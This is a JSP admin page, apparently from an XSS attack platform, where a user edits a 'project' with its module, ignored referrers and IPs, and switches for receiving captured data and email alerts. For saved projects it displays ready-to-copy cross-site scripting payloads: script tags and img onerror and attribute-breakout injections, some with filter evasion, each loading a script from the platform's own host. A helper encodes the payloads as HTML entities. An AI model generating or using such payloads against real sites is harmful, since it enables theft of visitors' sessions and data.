<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="/WEB-INF/tld/c.tld"%>
<%@ taglib prefix="fn" uri="/WEB-INF/tld/fn.tld"%>
<!doctype html>
<html>

<head>
<jsp:include page="../../includ/header.jsp" />
<style>
input {
	background-color: white !important;
}

.am-text-secondary {
	background-color: white !important;
}
</style>
</head>

<body data-type="index">


	<header class="am-topbar am-topbar-inverse admin-header">
		<jsp:include page="../../includ/nav.jsp" />
	</header>

	<div class="tpl-page-container tpl-page-header-fixed">
		<div class="tpl-left-nav tpl-left-nav-hover">
			<jsp:include page="../../includ/left.jsp" />
		</div>





		<div class="tpl-content-wrapper">
			<ol class="am-breadcrumb">
				<li><a href="#" class="am-icon-home">用户中心</a></li>
				<li><a href="#" class="am-icon-home">项目管理</a></li>
				<li class="am-active">项目编辑</li>
			</ol>
			<div class="tpl-portlet-components">
				<div class="portlet-title">
					<div class="caption font-green bold">
						<span class="am-icon-code"></span> 编辑项目信息
					</div>
				</div>
				<div class="tpl-block">
					<div class="am-g">
						<div class="tpl-form-body tpl-form-line">
							<form class="am-form tpl-form-line-form" id="dataform"
								onsubmit="submitForm();return false;">
								<input type="hidden" name="id" value="${projectInfo.id }">
								<div class="am-form-group">
									<label for="user-name" class="am-u-sm-3 am-form-label">名称</label>
									<div class="am-u-sm-9">
										<input type="text" class="tpl-form-input" id="user-name"
											name="title" placeholder="请填写项目名称" minlength="2"
											maxlength="32" value="${projectInfo.title }">
									</div>
								</div>
								<div class="am-form-group">
									<label for="user-phone" class="am-u-sm-3 am-form-label">模块
									</label>
									<div class="am-u-sm-9">
										<select name="moduleId">
											<c:if test="${!empty sysModules }">
												<optgroup label="系统模块">
													<c:forEach items="${sysModules }" var="module">
														<option value="${module.id }"
															${projectInfo.moduleId==module.id?'selected':'' }>${module.title }</option>
													</c:forEach>
												</optgroup>
											</c:if>
											<c:if test="${!empty userModules }">
												<optgroup label="我的模块">
													<c:forEach items="${userModules }" var="module">
														<option value="${module.id }"
															${projectInfo.moduleId==module.id?'selected':'' }>${module.title }</option>
													</c:forEach>
												</optgroup>
											</c:if>
										</select>
									</div>
								</div>
								<div class="am-form-group">
									<label for="user-name" class="am-u-sm-3 am-form-label">屏蔽来源</label>
									<div class="am-u-sm-9">
										<c:if
											test="${empty projectInfo.ignoreRef || (fn:length(projectInfo.ignoreRef)<'200' && !fn:contains(projectInfo.ignoreRef,';')) }">
											<input type="text" class="tpl-form-input" id="user-name"
												name="ignoreRef" value="${projectInfo.ignoreRef }">
										</c:if>
										<c:if
											test="${!empty projectInfo.ignoreRef && (fn:length(projectInfo.ignoreRef)>'200') }">
											<textarea class="" rows="10" id="user-intro" name="ignoreRef">${projectInfo.ignoreRef}</textarea>
										</c:if>
										<small>(空格分割,支持Ant通配符)</small>
									</div>
								</div>
								<div class="am-form-group">
									<label for="user-name" class="am-u-sm-3 am-form-label">屏蔽IP</label>
									<div class="am-u-sm-9">
										<c:if
											test="${empty projectInfo.ignoreIp || (fn:length(projectInfo.ignoreIp)<'200' && !fn:contains(projectInfo.ignoreIp,';')) }">
											<input type="text" class="tpl-form-input" id="user-name"
												name="ignoreIp" value="${projectInfo.ignoreIp }">
										</c:if>
										<c:if
											test="${!empty projectInfo.ignoreIp && (fn:length(projectInfo.ignoreIp)>'200') }">
											<textarea class="" rows="10" id="user-intro" name="ignoreIp">${projectInfo.ignoreIp}</textarea>
										</c:if>
										<small>(空格分割,支持Ant通配符)</small>
									</div>
								</div>
								<c:if test="${!empty projectInfo }">
									<div class="am-form-group">
										<hr>
									</div>
									<div class="am-form-group">
										<label for="user-intro" class="am-u-sm-3 am-form-label"><b>定制</b></label>
									</div>
									<c:forEach items="${mappings }" var="mapping">
										<div class="am-form-group">
											<label for="user-intro" class="am-u-sm-3 am-form-label">${mapping.type==1?"来源":"IP" }</label>
											<div class="am-u-sm-9">
												<input type="text" class="tpl-form-input" id="user-name"
													readonly="readonly" value="${mapping.mapping }">
											</div>
										</div>
										<div class="am-form-group">
											<label for="user-intro" class="am-u-sm-3 am-form-label">模块</label>
											<div class="am-u-sm-9">
												<input type="text" class="tpl-form-input" id="user-name"
													readonly="readonly" value="${mapping.moduleName }">
											</div>
										</div>
									</c:forEach>

									<div class="am-form-group">
										<label for="user-intro" class="am-u-sm-3 am-form-label"></label>
										<div class="am-u-sm-9">
											<button
												onclick="location.href='projectModuleCustom.${defSuffix}?projectId=${projectInfo.id }'"
												class="am-btn am-btn-default am-btn-xs am-text-secondary"
												type="button">管理定制</button>
										</div>
									</div>
								</c:if>
								<c:if test="${!empty projectInfo.id }">
									<div class="am-form-group">
										<hr>
									</div>
									<div class="am-form-group">
										<label for="user-intro" class="am-u-sm-3 am-form-label">代码</label>
										<div class="am-u-sm-9">
											<input type="text" class="tpl-form-input" id="user-name"
												readonly="readonly"
												value="&lt;script src=${projectInfo.sortUri }&gt;&lt;/script&gt;">
										</div>
									</div>
									<div class="am-form-group">
										<label for="user-intro" class="am-u-sm-3 am-form-label">代码</label>
										<div class="am-u-sm-9">
											<input type="text" class="tpl-form-input" id="user-name"
												readonly="readonly"
												value="&lt;img src=x onerror=s=createElement('script');body.appendChild(s);s.src='${projectInfo.sortUri }';&gt;">
										</div>
									</div>
									<div class="am-form-group">
										<label for="user-intro" class="am-u-sm-3 am-form-label">代码</label>
										<div class="am-u-sm-9">
											<input type="text" class="tpl-form-input" id="user-name"
												readonly="readonly"
												value="&lt;img src=x onerror=s=createElement('scrmipt'.replace('m',''));body.appendChild(s);s.src='${projectInfo.sortUri }';&gt;">
										</div>
									</div>
									<div class="am-form-group">
										<label for="user-intro" class="am-u-sm-3 am-form-label">代码</label>
										<div class="am-u-sm-9">
											<input type="text" class="tpl-form-input" id="user-name"
												readonly="readonly"
												value="x&quot; onerror=s=createElement('script');body.appendChild(s);s.src='${projectInfo.sortUri }'&quot;">
										</div>
									</div>
									<div class="am-form-group">
										<label for="user-intro" class="am-u-sm-3 am-form-label">代码</label>
										<div class="am-u-sm-9">
											<input type="text" class="tpl-form-input" id="user-name"
												readonly="readonly"
												value="x&quot; onerror=s=createElement('scrmipt'.replace('m',''));body.appendChild(s);s.src='${projectInfo.sortUri }'&quot;">
										</div>
									</div>
								</c:if>
								<div class="am-form-group">
									<hr>
								</div>
								<div class="am-form-group">
									<label for="user-intro" class="am-u-sm-3 am-form-label">开启收信</label>
									<div class="am-u-sm-9">
										<div class="tpl-switch">
											<input name="isOpen" value="${(empty projectInfo.isOpen)?'1':projectInfo.isOpen }"
												type="hidden" id="openPorject"> <input type="checkbox"
												style="width: 50px;height: 25px" id="openPorjectCheck"
												onchange="checkopenPorject()"
												class="ios-switch bigswitch tpl-switch-btn"
												${(empty projectInfo.isOpen||projectInfo.isOpen==1)?'checked':'' }>
											<div class="tpl-switch-btn-view">
												<div></div>
											</div>
										</div>

									</div>
								</div>
								<div class="am-form-group">
									<label for="user-intro" class="am-u-sm-3 am-form-label">邮件提醒</label>
									<div class="am-u-sm-9">
										<div class="tpl-switch">
											<input name="openEmail" value="${projectInfo.openEmail }"
												type="hidden" id="openEmail"> <input type="checkbox"
												style="width: 50px;height: 25px" id="openEmailCheck"
												onchange="checkopenEmail()"
												class="ios-switch bigswitch tpl-switch-btn"
												${projectInfo.openEmail==1?'checked':'' }>
											<div class="tpl-switch-btn-view">
												<div></div>
											</div>
										</div>

									</div>
								</div>
								<c:if
									test="${empty projectInfo || projectInfo.userId==curr_login_user.id}">
									<div class="am-form-group">
										<div class="am-u-sm-9 am-u-sm-push-3">
											<button type="submit"
												class="am-btn am-btn-primary tpl-btn-bg-color-success ">提交</button>
										</div>
									</div>
								</c:if>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>


	<jsp:include page="../../includ/js.jsp" />
</body>
<script>
	function submitForm() {
		$.ajax({
			type : "POST",
			dataType : 'json',
			data : $("#dataform").serialize(),
			url : 'projectSave.${defSuffix}',
			timeout : 60000,
			success : function(json) {
				alert(json.msg);
				if (json.code == 0) {
					location.href = document.referrer;
				}
			},
			error : function() {
				alert("系统繁忙");
			}
		});
	}
	function checkopenPorject() {
		if ($("#openPorjectCheck").is(':checked')) {
			$("#openPorject").val(1);
		} else {
			$("#openPorject").val(0);
		}
	}
	function checkopenEmail() {
		if ($("#openEmailCheck").is(':checked')) {
			$("#openEmail").val(1);
		} else {
			$("#openEmail").val(0);
		}
	}
	function convertToUnicode(source) {
		result = '';
		for (i = 0; i < source.length; i++) {
			result += '&#' + source.charCodeAt(i);
		}
		return result;
	}
</script>


</html>